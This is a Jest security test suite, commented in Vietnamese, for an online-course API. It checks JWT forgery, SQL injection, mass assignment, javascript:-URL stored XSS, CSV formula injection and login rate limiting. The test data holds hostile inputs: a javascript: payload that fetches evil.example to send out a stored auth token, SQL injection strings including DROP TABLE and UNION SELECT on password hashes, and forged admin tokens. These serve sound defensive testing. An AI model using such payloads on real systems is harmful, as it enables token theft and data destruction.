// Không bao giờ gửi email thật khi test (controller chờ SMTP trước khi trả response)
jest.mock('../src/utils/mailer', () => ({ sendResetPasswordEmail: jest.fn().mockResolvedValue() }));

const crypto  = require('crypto');
const jwt     = require('jsonwebtoken');
const request = require('supertest');
const app     = require('../src/app');
const {
  pool, resetDb, createUser, authHeader, DEFAULT_PASSWORD, createCourse, createLesson, enroll, createCategory,
} = require('./helpers');

beforeAll(resetDb);
afterAll(() => pool.end());

describe('Header bảo mật & CORS', () => {
  it('helmet: nosniff, chống clickjacking, ẩn X-Powered-By; ảnh /uploads vẫn dùng được từ FE khác cổng', async () => {
    const res = await request(app).get('/health');
    expect(res.headers['x-content-type-options']).toBe('nosniff');
    expect(res.headers['x-frame-options']).toBe('SAMEORIGIN');
    expect(res.headers['strict-transport-security']).toBeDefined();
    expect(res.headers['x-powered-by']).toBeUndefined();
    expect(res.headers['cross-origin-resource-policy']).toBe('cross-origin');
  });

  it('CORS chỉ cho phép đúng origin của FE', async () => {
    const ok = await request(app).get('/health').set('Origin', 'http://localhost:5173');
    expect(ok.headers['access-control-allow-origin']).toBe('http://localhost:5173');
    const evil = await request(app).get('/health').set('Origin', 'https://evil.example');
    expect(evil.headers['access-control-allow-origin']).not.toBe('https://evil.example');
  });
});

describe('JWT — không giả mạo được', () => {
  let user;
  beforeAll(async () => { user = await createUser(); });
  const call = (token) => request(app).get('/api/auth/me').set('Authorization', `Bearer ${token}`);

  it('alg "none" (không chữ ký) → 401', async () => {
    const b64 = (o) => Buffer.from(JSON.stringify(o)).toString('base64url');
    expect((await call(`${b64({ alg: 'none', typ: 'JWT' })}.${b64({ id: user.id, email: user.email, role: 'ADMIN' })}.`)).status).toBe(401);
  });

  it('ký bằng secret khác để tự nâng quyền ADMIN → 401', async () => {
    const forged = jwt.sign({ id: user.id, email: user.email, role: 'ADMIN' }, 'attacker-secret');
    expect((await call(forged)).status).toBe(401);
    expect((await request(app).get('/api/admin/dashboard').set('Authorization', `Bearer ${forged}`)).status).toBe(401);
  });

  it('token hết hạn → 401', async () => {
    const expired = jwt.sign({ id: user.id, email: user.email, role: 'USER' },
      process.env.JWT_ACCESS_SECRET || 'hoisted-access-secret-dev-change-in-prod', { expiresIn: -10 });
    expect((await call(expired)).status).toBe(401);
  });
});

describe('Đăng ký / mật khẩu', () => {
  it('không tự gán role ADMIN khi đăng ký (mass assignment)', async () => {
    const res = await request(app).post('/api/auth/register')
      .send({ name: 'Hacker', email: 'role@test.local', password: DEFAULT_PASSWORD, role: 'ADMIN', status: 'ACTIVE' });
    expect(res.status).toBe(201);
    expect(res.body.user.role).toBe('USER');
    expect((await pool.query('SELECT role FROM users WHERE email = ?', ['role@test.local']))[0][0].role).toBe('USER');
  });

  it.each([['quá ngắn', '1234567'], ['quá 72 byte', 'é'.repeat(40)]])('mật khẩu %s → 400', async (_l, password) => {
    const res = await request(app).post('/api/auth/register').send({ name: 'A B', email: `pw${password.length}@test.local`, password });
    expect(res.status).toBe(400);
  });

  it('đổi mật khẩu yếu → 400', async () => {
    const user = await createUser();
    const res = await request(app).put('/api/user/password').set(authHeader(user))
      .send({ currentPassword: user.password, newPassword: 'short' });
    expect(res.status).toBe(400);
  });

  it('quên mật khẩu: email có hay không có tài khoản đều trả cùng thông báo (không dò được email)', async () => {
    const user = await createUser();
    const a = await request(app).post('/api/auth/forgot-password').send({ email: user.email });
    const b = await request(app).post('/api/auth/forgot-password').send({ email: 'khong-ton-tai@test.local' });
    expect([a.status, b.status]).toEqual([200, 200]);
    expect(a.body.message).toBe(b.body.message);
  });

  it('token đặt lại mật khẩu chỉ dùng 1 lần, và thu hồi mọi phiên đăng nhập cũ', async () => {
    const user = await createUser();
    const login = await request(app).post('/api/auth/login').send({ email: user.email, password: user.password });
    const token = crypto.randomBytes(32).toString('hex');
    await pool.query('INSERT INTO password_resets (user_id, token, expires_at) VALUES (?, ?, DATE_ADD(NOW(), INTERVAL 1 HOUR))', [user.id, token]);

    expect((await request(app).post('/api/auth/reset-password').send({ token, password: 'MatKhauMoi#2026' })).status).toBe(200);
    expect((await request(app).post('/api/auth/reset-password').send({ token, password: 'MatKhauKhac#2026' })).status).toBe(400);
    expect((await request(app).post('/api/auth/refresh').send({ refreshToken: login.body.refreshToken })).status).toBe(401);
    expect((await request(app).post('/api/auth/login').send({ email: user.email, password: 'MatKhauMoi#2026' })).status).toBe(200);
  });
});

describe('SQL injection', () => {
  it.each([
    ["' OR '1'='1"],
    ["admin@test.local' -- "],
    ['"; DROP TABLE users; --'],
  ])('đăng nhập với email %s → 401, bảng users còn nguyên', async (email) => {
    const res = await request(app).post('/api/auth/login').send({ email, password: "' OR '1'='1" });
    expect(res.status).toBe(401);
    const [[{ n }]] = await pool.query('SELECT COUNT(*) AS n FROM users');
    expect(n).toBeGreaterThan(0);
  });

  it('tìm kiếm khóa học với chuỗi injection → 200, không lỗi máy chủ', async () => {
    const res = await request(app).get('/api/courses').query({ search: "%' UNION SELECT password_hash FROM users -- " });
    expect(res.status).toBe(200);
    expect(JSON.stringify(res.body)).not.toMatch(/\$2[aby]\$/);
  });
});

describe('Link tài liệu bài học — chỉ http(s) (chống stored XSS qua javascript:)', () => {
  const XSS = "javascript:fetch('https://evil.example/?t='+localStorage.getItem('hoisted.auth'))";
  let teacher; let course; let lesson;
  beforeAll(async () => {
    teacher = await createUser({ role: 'INSTRUCTOR' });
    course = await createCourse({ instructor: teacher });
    lesson = await createLesson(course.id);
  });
  const urlOf = async () => (await pool.query('SELECT attachment_url FROM lessons WHERE id = ?', [lesson.id]))[0][0].attachment_url;

  it.each([XSS, 'JaVaScRiPt:alert(1)', 'data:text/html,<script>alert(1)</script>', 'không-phải-url', 42])(
    'giảng viên sửa bài học với %p → 400, không lưu', async (attachmentUrl) => {
      const res = await request(app).put(`/api/instructor/lessons/${lesson.id}`).set(authHeader(teacher)).send({ attachmentUrl });
      expect(res.status).toBe(400);
      expect(await urlOf()).toBeNull();
    },
  );

  it('giảng viên tạo bài học với link javascript: → 400', async () => {
    const res = await request(app).post(`/api/instructor/courses/${course.id}/lessons`).set(authHeader(teacher))
      .send({ title: 'Bài có link độc', attachmentUrl: XSS });
    expect(res.status).toBe(400);
  });

  it('link https hợp lệ được lưu; chuỗi rỗng gỡ link', async () => {
    const ok = 'https://developer.mozilla.org/en-US/docs/Web/JavaScript';
    expect((await request(app).put(`/api/instructor/lessons/${lesson.id}`).set(authHeader(teacher)).send({ attachmentUrl: ok })).status).toBe(200);
    expect(await urlOf()).toBe(ok);
    expect((await request(app).put(`/api/instructor/lessons/${lesson.id}`).set(authHeader(teacher)).send({ attachmentUrl: '' })).status).toBe(200);
    expect(await urlOf()).toBeNull();
  });

  it('dòng cũ đã lưu link javascript: không bao giờ được trả cho học viên', async () => {
    const student = await createUser();
    await enroll(student, course.id);
    await pool.query('UPDATE lessons SET attachment_url = ? WHERE id = ?', [XSS, lesson.id]);
    const res = await request(app).get(`/api/lessons/${lesson.id}/attachment`).set(authHeader(student));
    expect(res.status).toBe(404);
    expect(JSON.stringify(res.body)).not.toContain('javascript');
  });
});

describe('Xuất CSV — chống CSV/formula injection', () => {
  it('họ tên bắt đầu bằng = + - @ được thêm dấu \' và nháy kép được nhân đôi', async () => {
    const admin = await createUser({ role: 'ADMIN' });
    const evil = await createUser({ name: '=HYPERLINK("https://evil.example","Bấm")' });
    const res = await request(app).get('/api/admin/users/export').query({ search: evil.email }).set(authHeader(admin));
    expect(res.status).toBe(200);
    expect(res.text).toContain(`"'=HYPERLINK(""https://evil.example"",""Bấm"")"`);
    expect(res.text).not.toMatch(/,=HYPERLINK|,"=HYPERLINK/);
  });
});

describe('Admin tạo khóa học', () => {
  it('không tạo thẳng ở trạng thái Đã xuất bản / Chờ duyệt (khóa mới chưa có bài) hay trạng thái lạ', async () => {
    const admin = await createUser({ role: 'ADMIN' });
    const cat = await createCategory();
    const create = (status) => request(app).post('/api/admin/courses').set(authHeader(admin))
      .send({ title: `Khóa ${status}`, slug: `khoa-${status.toLowerCase()}-${Date.now()}`, categoryId: cat.id, price: 0, status });
    for (const status of ['PUBLISHED', 'PENDING_REVIEW', 'HACKED']) expect((await create(status)).status).toBe(400);
    expect((await create('DRAFT')).status).toBe(201);
  });
});

describe('Dữ liệu sai kiểu / quá dài → 400 có lời giải thích, không phải 500', () => {
  it('khóa học: tên quá dài, slug có dấu, cấp độ lạ, ảnh bìa javascript:, tên là object', async () => {
    const admin = await createUser({ role: 'ADMIN' });
    const cat = await createCategory();
    const base = () => ({ title: 'Khóa hợp lệ', slug: `hop-le-${Date.now()}-${Math.random().toString(36).slice(2, 6)}`, categoryId: cat.id, price: 0 });
    const create = (patch) => request(app).post('/api/admin/courses').set(authHeader(admin)).send({ ...base(), ...patch });
    for (const patch of [
      { title: 'x'.repeat(256) }, { slug: 'Khóa Học' }, { level: 'EXPERT' },
      { thumbnailUrl: 'javascript:alert(1)' }, { title: { $gt: '' } }, { shortDescription: 'y'.repeat(501) },
    ]) {
      const res = await create(patch);
      expect({ patch, status: res.status }).toEqual({ patch, status: 400 });
    }
    expect((await create({ thumbnailUrl: 'http://localhost:3001/uploads/a.png' })).status).toBe(201);
    const created = await create({});
    expect((await request(app).put(`/api/admin/courses/${created.body.id}`).set(authHeader(admin)).send({ level: 'EXPERT' })).status).toBe(400);
  });

  it('hồ sơ: họ tên là object / quá dài, tên đăng nhập sai mẫu → 400', async () => {
    const user = await createUser();
    const update = (body) => request(app).put('/api/user/profile').set(authHeader(user)).send({ name: 'Hợp Lệ', ...body });
    for (const body of [{ name: { a: 1 } }, { name: 'n'.repeat(101) }, { username: 'Có Dấu' }, { phone: 'abc' }, { bio: 5 }]) {
      expect((await update(body)).status).toBe(400);
    }
    expect((await update({ username: 'hop.le_1', phone: '+84 912 345 678' })).status).toBe(200);
  });
});

describe('JWT secret khi chạy production', () => {
  const load = (env) => {
    const saved = { ...process.env };
    Object.assign(process.env, env);
    try {
      let mod;
      jest.isolateModules(() => { mod = require('../src/utils/jwt'); });
      return mod;
    } finally {
      process.env = saved;
    }
  };

  it('thiếu, quá ngắn hoặc còn giá trị mẫu "change-me" → dừng khởi động; secret đủ dài → chạy', () => {
    const strong = 'x'.repeat(40);
    expect(() => load({ NODE_ENV: 'production', JWT_ACCESS_SECRET: '', JWT_REFRESH_SECRET: strong })).toThrow(/JWT_ACCESS_SECRET/);
    expect(() => load({ NODE_ENV: 'production', JWT_ACCESS_SECRET: 'short', JWT_REFRESH_SECRET: strong })).toThrow(/32 ký tự/);
    expect(() => load({ NODE_ENV: 'production', JWT_ACCESS_SECRET: 'change-me-in-production-use-32plus-chars', JWT_REFRESH_SECRET: strong })).toThrow();
    expect(() => load({ NODE_ENV: 'production', JWT_ACCESS_SECRET: strong, JWT_REFRESH_SECRET: strong })).not.toThrow();
  });
});

describe('Chống brute-force đăng nhập', () => {
  let limitedApp; let limitedPool;
  beforeAll(() => {
    jest.isolateModules(() => {
      process.env.AUTH_LOGIN_RATE_LIMIT = '3';
      limitedApp = require('../src/app');
      limitedPool = require('../src/config/db');
      process.env.AUTH_LOGIN_RATE_LIMIT = '1000';
    });
  });
  afterAll(() => limitedPool.end());

  it('sai mật khẩu quá 3 lần → 429, kể cả khi sau đó nhập đúng', async () => {
    const user = await createUser();
    const statuses = [];
    for (let i = 0; i < 4; i += 1) {
      statuses.push((await request(limitedApp).post('/api/auth/login').send({ email: user.email, password: 'sai-mat-khau' })).status);
    }
    expect(statuses).toEqual([401, 401, 401, 429]);
    expect((await request(limitedApp).post('/api/auth/login').send({ email: user.email, password: user.password })).status).toBe(429);
  });

  it('đăng nhập đúng (nhiều lần liên tiếp, cùng giây) không bị tính và không lỗi', async () => {
    const user = await createUser();
    for (let i = 0; i < 5; i += 1) {
      expect((await request(limitedApp).post('/api/auth/login').send({ email: user.email, password: user.password })).status).toBe(200);
    }
  });
});
